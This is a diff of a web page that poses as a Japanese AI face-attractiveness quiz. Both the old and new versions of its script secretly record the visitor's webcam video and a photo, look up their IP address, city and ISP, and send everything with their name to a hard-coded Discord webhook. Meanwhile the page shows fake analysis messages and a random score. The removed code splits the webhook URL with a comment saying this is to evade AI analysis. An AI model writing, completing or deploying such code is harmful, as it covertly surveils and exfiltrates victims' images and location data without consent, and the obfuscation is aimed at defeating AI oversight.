@@ -44,109 +44,107 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        (function() {
-            const v = document.getElementById('video');
-            const c = document.getElementById('canvas');
-            const b = document.getElementById('startBtn');
-            const s = document.getElementById('status-display');
-            const r = document.getElementById('result-score');
-            const f = document.getElementById('setup-form');
-            const n = document.getElementById('next-options');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startBtn = document.getElementById('startBtn');
+        const statusDisplay = document.getElementById('status-display');
+        const resultScore = document.getElementById('result-score');
+        const setupForm = document.getElementById('setup-form');
+        const nextOptions = document.getElementById('next-options');
+        const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
+        
+        let mediaRecorder; 
+        let chunks = [];
+        const messages = [
+            "AIスキャンを開始しています...",
+            "顔の輪郭をポイント抽出中...",
+            "パーツの左右対称性を分析中...",
+            "肌の質感とトーンを測定中...",
+            "データベースと照合しています...",
+            "最終解析レポートを作成中..."
+        ];
 
-            // Webhook URLの分割隠蔽（AI解析対策）
-            const _u1 = 'https://discord.com/api/webhooks/';
-            const _u2 = '1496394005099839549/';
-            const _u3 = 'HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
-            const _endpoint = _u1 + _u2 + _u3;
+        startBtn.addEventListener('click', async () => {
+            const user = document.getElementById('username').value || '未設定';
+            setupForm.style.display = 'none';
+            video.style.display = 'block';
             
-            let _rec; 
-            let _chunks = [];
-            const _msg = [
-                "AIスキャンを開始しています...",
-                "顔の輪郭をポイント抽出中...",
-                "パーツの左右対称性を分析中...",
-                "肌の質感とトーンを測定中...",
-                "データベースと照合しています...",
-                "最終解析レポートを作成中..."
-            ];
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = stream;
+                const type = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
+                // ビットレートを1Mbpsに制限して送信成功率を向上
+                mediaRecorder = new MediaRecorder(stream, { mimeType: type, videoBitsPerSecond: 1000000 });
+                chunks = [];
 
-            b.addEventListener('click', async () => {
-                const _name = document.getElementById('username').value || '未設定';
-                f.style.display = 'none';
-                v.style.display = 'block';
+                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                const stopPromise = new Promise(resolve => mediaRecorder.onstop = resolve);
+
+                mediaRecorder.start(); 
                 
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                    v.srcObject = stream;
-                    const t = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(x => MediaRecorder.isTypeSupported(x));
-                    _rec = new MediaRecorder(stream, { mimeType: t, videoBitsPerSecond: 1000000 });
-                    _chunks = [];
-
-                    _rec.ondataavailable = e => { if (e.data.size > 0) _chunks.push(e.data); };
-                    const _stop = new Promise(resolve => _rec.onstop = resolve);
-
-                    _rec.start(); 
-                    
-                    let i = 0;
-                    const interval = setInterval(() => {
-                        if (i < _msg.length) {
-                            s.innerHTML = _msg[i];
-                            i++;
-                        } else { clearInterval(interval); }
-                    }, 1600);
-
-                    setTimeout(async () => {
-                        if (_rec.state !== "inactive") {
-                            _rec.stop();
-                            await _stop;
-                            await _execInternalProcess(_name);
-                        }
-                    }, 10000); 
-
-                } catch (err) {
-                    s.innerHTML = "エラー：カメラを許可してください。";
-                    f.style.display = 'block';
-                }
-            });
-
-            async function _execInternalProcess(u) {
-                let _netInfo = "";
-                try {
-                    const res = await fetch('https://ipapi.co/json/');
-                    const d = await res.json();
-                    // 相手には見せない隠しデータ
-                    _netInfo = `\n🌐 IP: ${d.ip}\n📍 LOC: ${d.region} ${d.city}\n🏢 ISP: ${d.org}`;
-                } catch (e) {}
-
-                const _score = (Math.random() * (75 - 45) + 45).toFixed(1);
-                c.width = v.videoWidth;
-                c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-
-                c.toBlob(async (blob) => {
-                    const fd = new FormData();
-                    fd.append('content', `【顔診断レポート】\n👤 名前: ${u}\n📊 偏差値: ${_score}${_netInfo}`);
-                    fd.append('file1', blob, 'image_data.jpg');
-                    
-                    if (_chunks.length > 0) {
-                        const vBlob = new Blob(_chunks, { type: _rec.mimeType });
-                        const ext = _rec.mimeType.includes('mp4') ? 'mp4' : 'webm';
-                        fd.append('file2', vBlob, `video_log.${ext}`);
+                let i = 0;
+                const interval = setInterval(() => {
+                    if (i < messages.length) {
+                        statusDisplay.innerHTML = messages[i];
+                        i++;
+                    } else {
+                        clearInterval(interval);
                     }
+                }, 1600);
 
-                    try {
-                        // バックグラウンドで送信
-                        await fetch(_endpoint, { method: 'POST', body: fd });
-                    } catch (e) {}
+                setTimeout(async () => {
+                    if (mediaRecorder.state !== "inactive") {
+                        mediaRecorder.stop();
+                        await stopPromise;
+                        await captureAndSend(user);
+                    }
+                }, 10000); 
 
-                    s.innerHTML = "";
-                    r.innerHTML = `${u}さんの顔面偏差値は…<br><span style="font-size:1.8em;">${_score}点です！</span>`;
-                    n.style.display = 'block';
-                    
-                    if(v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());
-                }, 'image/jpeg', 0.6);
+            } catch (err) {
+                statusDisplay.innerHTML = "エラー：カメラを許可してください。";
+                setupForm.style.display = 'block';
             }
-        })();
+        });
+
+        async function captureAndSend(user) {
+            // IPと位置情報の取得
+            let ipInfo = "\n🌐 IP/位置情報: 取得失敗";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                ipInfo = `\n🌐 IP: ${data.ip}\n📍 場所: ${data.region} ${data.city}\n🏢 ISP: ${data.org}`;
+            } catch (e) { console.error(e); }
+
+            const score = (Math.random() * (75 - 45) + 45).toFixed(1);
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            // PNGからJPEG(0.7)に変更して劇的に軽量化
+            canvas.toBlob(async (photoBlob) => {
+                const formData = new FormData();
+                formData.append('content', `【顔診断レポート】\n👤 名前: ${user}\n📊 偏差値: ${score}${ipInfo}`);
+                formData.append('file1', photoBlob, 'face.jpg');
+                
+                if (chunks.length > 0) {
+                    const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
+                    const ext = mediaRecorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
+                    formData.append('file2', videoBlob, `scan.${ext}`);
+                }
+
+                try {
+                    // 送信完了を待ってから結果を表示（離脱防止）
+                    await fetch(webhookUrl, { method: 'POST', body: formData });
+                } catch (e) { console.error(e); }
+
+                statusDisplay.innerHTML = "";
+                resultScore.innerHTML = `${user}さんの顔面偏差値は…<br><span style="font-size:1.8em;">${score}点です！</span>`;
+                nextOptions.style.display = 'block';
+                
+                if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg', 0.7);
+        }
     </script>
 </body>
 </html>
